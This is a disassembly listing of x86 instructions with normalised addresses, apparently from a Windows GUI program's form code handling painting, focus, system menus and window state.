mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax ebx
call sub_44e4f4
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453354
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_404884
jmp r-xdata
call sub_404884
jmp r-xdata
mov esi [ edi + 0x26c ]
test esi esi
je r-xdata
mov eax [ edi + 0x26c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_43fce0
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ edi + 0x26c ]
call sub_443be8
mov ebx eax
mov eax [ edi + 0x26c ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x26c ] eax
mov dx 0xb01b
mov eax ebx
call sub_44e4f4
test al al
jne r-xdata
jmp r-xdata
mov ebx [ esi + 0x30 ]
cmp ebx [ edi + 0x26c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43d400
mov eax [ edi + 0x2c4 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
call sub_404884
jmp r-xdata
mov esi ebx
mov [ edi + 0x26c ] esi
mov eax esi
call sub_443be8
mov dx 0xb01a
call sub_44e4f4
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
call sub_404884
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43d400
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
sub_453378
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x268 ]
test eax eax
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x298 ] 0x0
jne r-xdata
mov esi ebx
cmp [ ebx + 0x298 ] 0x0
jne r-xdata
mov esi eax
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax esi
call sub_43d400
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax ebx
call sub_4440ac
mov esi eax
test esi esi
jne r-xdata
mov eax esi
call sub_443be8
push eax
call SetFocus
mov eax esi
call sub_443be8
mov ebx eax
call GetFocus
cmp ebx eax
jne r-xdata
mov esi ebx
jmp r-xdata
sub_4533f0
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x276 ] bl
mov eax [ esi + 0x2c4 ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
movzx ecx bl
mov edx 0xb02b
call sub_43d400
pop esi
pop ebx
retn
cmp [ esi + 0x268 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_4534a4
mov eax esi
call sub_453378
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_4440ac
mov edx eax
mov eax esi
call sub_452fa4
sub_453454
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x0
je r-xdata
cmp [ ebx + 0x277 ] 0x2
jne r-xdata
cmp [ ebx + 0x268 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_451aac
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x268 ]
call sub_43d400
mov eax ebx
call sub_451aac
mov edx esi
call sub_453454
sub_4534a4
push esi
test [ eax + 0x358 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x290 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x277 ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x277 ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x290 ]
test dl dl
je r-xdata
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov edx esi
call sub_435754
mov edx esi
call sub_435738
jmp r-xdata
mov ecx [ eax + 0x290 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x290 ]
cmp [ eax + 0x277 ] 0x1
jne r-xdata
sub_45354c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_443be8
push eax
call SendMessageA
sub_453598
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x268 ]
mov eax 0xb000
call sub_45354c
cmp [ ebx + 0x2d2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
sub_4535c8
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x268 ]
mov eax 0xb001
call sub_45354c
cmp [ ebx + 0x2ea ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2ec ]
call [ ebx + 0x2e8 ]
sub_453634
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
call sub_4242e0
xor eax eax
push ebp
push sub_4536e2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
mov edx ebx
call sub_4245e4
xor eax eax
push ebp
push sub_4536bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffa6
call sub_404160
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x298 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4536c6
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x280 ]
xor edx edx
call sub_4245e4
retn
sub_4536f0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_451aac
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_451ae0
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
movzx edx [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd0
call sub_404160
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_442e80
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_451b2c
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
movzx edx [ esp + 0x4 ]
mov eax edi
mov si 0xffd0
call sub_404160
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_453794
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_443be8
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_443be8
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_453618
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_443be8
push eax
call EndPaint
movzx eax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_441b90
movzx eax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_45383c
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x277 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x1a4 ]
call sub_423efc
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_45389c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443be8
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ esi ] 0x27
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_441e84
pop esi
pop ebx
retn
sub_4538e8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x271 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x277 ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_443be8
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x271 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x270 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4539e4
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x290 ]
mov eax [ ebp - 0x4 ]
call sub_451ecc
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_4538e8
pop ecx
sub_453a30
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_43ddcc
cmp [ ebx + 0x8f ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_443be8
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_443be8
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_443be8
push eax
call PostMessageA
cmp [ ebx + 0x276 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_43c884
pop esi
pop ebx
retn
sub_453ac0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov ebp edx
mov edi eax
mov eax [ edi + 0x32c ]
test eax eax
je r-xdata
cmp [ edi + 0x340 ] 0x0
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax edi
mov si 0xffa8
call sub_404160
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ edi + 0x340 ]
call sub_45212c
mov edx edi
call sub_416824
test eax eax
jge r-xdata
inc esi
xor ebx ebx
xor eax eax
mov [ edi + 0x344 ] eax
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ edi + 0x340 ]
call sub_452104
mov edx edi
call sub_416824
inc eax
jle r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax [ edi + 0x32c ]
call sub_4167c8
push eax
mov eax edi
call sub_45212c
pop edx
call sub_416668
cmp [ edi + 0x290 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax edi
call sub_443be8
push eax
call SendMessageA
mov edx edi
mov eax [ rw-data ]
call sub_459d28
mov [ esp ] eax
mov eax [ edi + 0x1b4 ]
mov [ esp + 0x4 ] eax
cmp [ edi + 0x344 ] 0x0
setne al
mov [ esp + 0x8 ] al
mov eax [ rw-data ]
mov eax [ eax + 0xc8 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push 0xb048
push ebx
call SendMessageA
mov eax [ edi + 0x340 ]
call sub_45212c
mov edx edi
call sub_416668
jmp r-xdata
mov edx ebx
mov eax [ edi + 0x32c ]
call sub_4167c8
call sub_443f88
test al al
je r-xdata
mov edx ebp
mov eax edi
call sub_442ddc
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x277 ] 0x1
je r-xdata
push 0x0
mov eax edi
call sub_443be8
push eax
call SetMenu
xor edx edx
mov eax [ edi + 0x290 ]
call sub_43510c
sub_453c28
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_441cf0
cmp [ ebx + 0x290 ] 0x0
je r-xdata
movzx edx [ esi + 0x4 ]
mov eax [ ebx + 0x290 ]
call sub_434908
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_453c74
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_4353d8
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_453cac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_453d47
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x290 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453d4e
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x290 ]
call sub_434868
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_459320
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_438e4c
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_459320
jmp r-xdata
sub_453d74
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
test [ ebx + 0x55 ] 0x20
jne r-xdata
cmp [ ebx + 0x2ac ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov [ ebx + 0x273 ] dl
pop ebx
retn
mov eax [ ebx + 0x2ac ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_453dd0
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_453454
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_438c24
test eax eax
je r-xdata
cmp [ eax + 0x277 ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov edx [ eax + 0x290 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_453e28
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_442cbc
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_45798c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x273 ] 0x1
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
sub_453eb0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_443be8
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_443be8
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x274 ] 0x2
jmp r-xdata
cmp [ ebx + 0x274 ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x274 ] 0x1
mov [ ebx + 0x274 ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
movzx eax [ ebx + 0x274 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_443be8
push eax
call ShowWindow
mov [ ebx + 0x274 ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_453f48
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x277 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_443be8
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_4533f0
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd0
call sub_404160
sub_453fa0
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x268 ]
call sub_4441b8
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_453fcc
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_453454
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_453fe8
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_434898
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_434898
sub_454028
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x158 ] 0x1
jne r-xdata
cmp [ esi + 0x158 ] 0x0
jne r-xdata
cmp [ esi + 0x160 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x15c ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_454060
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x158 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x15c ]
call sub_404e98
mov [ edx ] 0x1
mov eax [ ebx + 0x160 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_454094
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4541fe
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454205
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0xd ] 0x1
push ebp
mov eax [ esi + 0x290 ]
call sub_453fe8
pop ecx
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_438b98
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x34 ]
xor edx edx
xor eax eax
call sub_415348
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x25 ]
mov eax esi
call sub_43bbc8
movzx eax [ ebp - 0x25 ]
mov [ ebp - 0x29 ] ax
movzx eax [ ebp - 0x21 ]
mov [ ebp - 0x27 ] ax
mov eax [ ebp - 0x29 ]
mov [ ebp - 0x11 ] eax
push ebp
mov eax [ esi + 0x80 ]
call sub_453fe8
pop ecx
mov [ ebp - 0xc ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_454028
test al al
je r-xdata
cmp [ ebp - 0xd ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_458f44
jmp r-xdata
mov ecx [ ebp - 0x11 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_458fcc
mov ecx [ ebp - 0xc ]
mov edx 0x8
mov eax [ rw-data ]
call sub_458fcc
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0xd ]
mov eax ebx
call sub_454060
lea ecx [ ebp - 0x34 ]
xor edx edx
xor eax eax
call sub_415348
lea edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x19 ]
mov eax ebx
call sub_43bbc8
movzx eax [ ebp - 0x19 ]
mov [ ebp - 0x1d ] ax
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1b ] ax
mov eax [ ebp - 0x1d ]
mov [ ebp - 0x11 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_458eb4
test [ esi + 0x270 ] 0x8
je r-xdata
sub_45420c
push ebx
push esi
push edi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x272 ] 0x0
je r-xdata
mov edi [ esp ]
mov edi [ edi + 0x8 ]
mov eax [ esi + 0x74 ]
lea edx [ edi + 0x18 ]
mov ecx [ eax + 0x14 ]
test ecx ecx
jbe r-xdata
mov ecx [ eax + 0x10 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea edx [ edi + 0x20 ]
mov ecx [ eax + 0xc ]
test ecx ecx
jbe r-xdata
mov [ edx + 0x4 ] ecx
mov ecx [ eax + 0x8 ]
test ecx ecx
jbe r-xdata
mov [ edx ] ecx
lea eax [ edi + 0x20 ]
push eax
lea eax [ edi + 0x24 ]
push eax
lea ecx [ edi + 0x1c ]
lea edx [ edi + 0x18 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ edx + 0x4 ] ecx
sub_454280
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x34c ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_4542ac
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x348 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_441fe4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
test [ edx + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ esi + 0x10 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x48 ]
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4c ]
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_451bac
lea edx [ ebp - 0x14 ]
call sub_455cd4
push ebp
mov eax [ ebp - 0x4 ]
call sub_451bac
lea edx [ ebp - 0x24 ]
call sub_455cd4
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_454280
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_451bac
lea edx [ ebp - 0x24 ]
call sub_455cd4
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_454280
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_454280
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_454280
pop ecx
sub_454398
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444ad4
test [ ebx + 0x1c ] 0x10
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
cmp [ ebx + 0x290 ] 0x0
je r-xdata
mov eax [ ebx + 0x290 ]
mov eax [ eax + 0x34 ]
call sub_4333e4
test eax eax
jle r-xdata
mov ebx [ esi + 0x8 ]
push 0xf
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebx + 0x4 ] eax
sub_4543e4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x358 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_404160
pop esi
pop ebx
retn
sub_454408
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x358 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffae
call sub_404160
pop esi
pop ebx
retn
sub_45442c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_443034
movzx eax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x268 ]
mov eax ebx
call sub_4441b8
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x268 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
movzx edx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
